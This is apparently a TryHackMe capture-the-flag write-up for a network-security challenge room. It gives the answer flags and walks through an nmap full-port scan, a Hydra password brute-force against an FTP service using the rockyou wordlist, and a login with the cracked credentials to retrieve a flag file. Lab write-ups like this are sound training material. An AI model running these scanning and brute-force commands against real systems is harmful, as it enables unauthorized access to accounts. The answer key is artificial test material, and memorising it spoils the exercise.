# TryHackMe Writeup :https://tryhackme.com/room/netsecchallenge 

**Target IP:** `10.49.148.119`  
**Tools Used:** `Nmap`, `Hydra`, `FTP`

---

## Task Questions & Answers

### Q1. What is the highest port number that is open and less than 10,000?
**Answer:** `8081`

### Q2. There is an open port outside the common 1000 ports; it is above 10,100. What is it?
**Answer:** `10121`

### Q3. How many TCP ports are open?
**Answer:** `7`  
*(Open ports found: 22, 80, 139, 445, 8081, 10001, 10121)*

### Q4. On port 80, what is the service version value?
**Answer:** `THM{MySpecialServer007}`

### Q5. What is the flag hidden in the SSH server header?
**Answer:** `THM{946219583339}`

### Q6. We have an FTP server listening on a nonstandard port. What is the version of the FTP server?
**Answer:** `vsftpd 3.0.5`

### Q7. We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?
**Answer:** `THM{QUINN_IS_BACK007}`

### Q8. Browsing to http://10.49.148.119:8081 displays a small challenge that will give you a flag once you solve it. What is the flag?
*(Note: Resolve by interacting with the Express challenge at `http://10.49.148.119:8081`)*

---

## Detailed Walkthrough & Execution Steps

### 1. Network Reconnaissance (Nmap)

Run a full TCP port scan with service detection and default scripts to discover all open ports:

```bash
nmap -sC -sV -p- 10.49.148.119
```

#### Nmap Output Summary
```text
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         (protocol 2.0)
| SSH-2.0-OpenSSH_8.2p1 THM{946219583339}
80/tcp    open  http        THM{MySpecialServer007}
|_http-server-header: THM{MySpecialServer007}
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
8081/tcp  open  http        Node.js (Express middleware)
10001/tcp open  scp-config?
10121/tcp open  ftp         vsftpd 3.0.5
```

---

### 2. FTP Brute-Force Attack (Hydra)

Attempt to crack the FTP login on the non-standard port `10121` using the user list acquired via social engineering (`quinn`):

```bash
hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://10.49.148.119:10121
```

#### Terminal Response
```text
[10121][ftp] host: 10.49.148.119   login: quinn   password: cookie
```

---

### 3. File Retrieval via FTP

Connect to the target FTP server using the recovered credentials (`quinn:cookie`) and extract the flag file:

```bash
ftp 10.49.148.119 10121
```

#### Interactive Session Log
```text
Connected to 10.49.148.119.
220 (vsFTPd 3.0.5)
Name (10.49.148.119:kali): quinn
331 Please specify the password.
Password:
230 Login successful.
ftp> ls -la
-rw-rw-r--    1 1002     1002           22 Feb 24 08:52 ftp_flag.txt
ftp> get ftp_flag.txt
226 Transfer complete.
ftp> exit
```

Read the contents of the retrieved file:

```bash
cat ftp_flag.txt
```

```text
THM{QUINN_IS_BACK007}
```
![alt text](<../Screenshots/Screenshot (76).png>)